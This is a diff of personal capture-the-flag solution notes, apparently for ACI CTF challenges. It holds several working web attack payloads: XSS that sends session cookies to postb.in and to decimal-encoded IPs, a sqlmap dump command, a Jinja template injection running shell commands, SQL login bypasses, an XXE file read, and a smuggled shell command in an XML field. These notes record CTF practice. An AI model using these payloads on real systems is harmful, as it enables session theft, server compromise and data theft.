@@ -46,7 +46,7 @@ I plan to keep working on these scripts to make them actually good.
 
 * same startup as before
 * inside qemu do "ctrl+alt+2"
-* xp/2c 0x7dc0
+* `xp/2c 0x7dc0`
 
 ## hacker, scan thyself
 
@@ -66,7 +66,7 @@ I plan to keep working on these scripts to make them actually good.
 
 ## boot racer
 
-* watch -l *(char *)0x7dc0
+* `watch -l *(char *)0x7dc0`
 * same as before, once it breaks keep doing n and x/s 0x7dc0 to print flag
 
 ## library_card
@@ -77,31 +77,33 @@ int main(){
 	return 0;
 }
 ```
-`cp liblibrary_card.so /usr/lib`
-`chmod 755 /usr/lib/liblibrary_card.so`
-`ldconfig`
-`gcc test.c -o test -llibrary_card`
-`./test`
-https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html
+
+* `cp liblibrary_card.so /usr/lib`
+* `chmod 755 /usr/lib/liblibrary_card.so`
+* `ldconfig`
+* `gcc test.c -o test -llibrary_card`
+* `./test`
+* https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html
 
 ## cookie monster
 
-* name=flag&ingredients=<script>document.write('<img src%3D"https://postb.in/1587858395408-8044362019281?'%2Bdocument.cookie%2B' "/>')</script>
+* `name=flag&ingredients=<script>document.write('<img src%3D"https://postb.in/1587858395408-8044362019281?'%2Bdocument.cookie%2B' "/>')</script>`
 * replace session cookie and go to /admin
 
 ## the sql always sucks
 
-* sqlmap -u http://challenge.acictf.com:27748/?firstname=test --random-agent --level=5 --risk=3 -D firstname -T SuperSecretData -C flag --dump
+* `sqlmap -u http://challenge.acictf.com:27748/?firstname=test --random-agent --level=5 --risk=3 -D firstname -T SuperSecretData -C flag --dump`
 
 
 ## I have caught you now
 
-* &period;
+```
 * challenge.acictf.com:32317/search?se</code>a<svg/onload%3dalert(cookie)>a<code>rch=<script>
-> https://www.ipaddressguide.com/ip
-> http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/src%3Dhttp://167837204:2018/cookie/%3Ea%3Ccode%3Erch=%3Cscript%3E
-> http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/src%3Dhttp://2886795265:2018/cookie/%3Ea%3Ccode%3Erch=%3Cscript%3E
-> http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/onload%3Dalert(location%3D%26quot;https://postb%26period;in/1587951532697-0760058402083%3F%26quot;%26plus;cookie)%3Ea%3Ccode%3Erch=%3Cscript%3E
+* https://www.ipaddressguide.com/ip
+* http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/src%3Dhttp://167837204:2018/cookie/%3Ea%3Ccode%3Erch=%3Cscript%3E
+* http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/src%3Dhttp://2886795265:2018/cookie/%3Ea%3Ccode%3Erch=%3Cscript%3E
+* http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/onload%3Dalert(location%3D%26quot;https://postb%26period;in/1587951532697-0760058402083%3F%26quot;%26plus;cookie)%3Ea%3Ccode%3Erch=%3Cscript%3E
+```
 
 ## c&c music factory
 
@@ -131,8 +133,11 @@ https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html
 * `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat *').read()}}{%endif%}{%endfor%}`
 
 ## extremely malicious language
-admin' or '1'='1:' or '1'='1
-payloadallthethings:
+
+* `admin' or '1'='1:' or '1'='1`
+
+* payloadallthethings:
+
 ```xml
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=make.php"> ]>
 <cybermap>
@@ -141,7 +146,9 @@ payloadallthethings:
 	<country>US</country>
 </cybermap>
 ```
-then:
+
+* then:
+
 ```xml
 <cybermap>
 	<name>CYBER MAP</name>
@@ -149,10 +156,11 @@ then:
 	<country>US\")';./flag;#</country>
 </cybermap>
 ```
-view source
+
+* view source
 
 ## firstfail
-* http://10.0.254.20:2018/madstacks.html *
+* http://10.0.254.20:2018/madstacks.html
 ```html
 <html>
   <body>
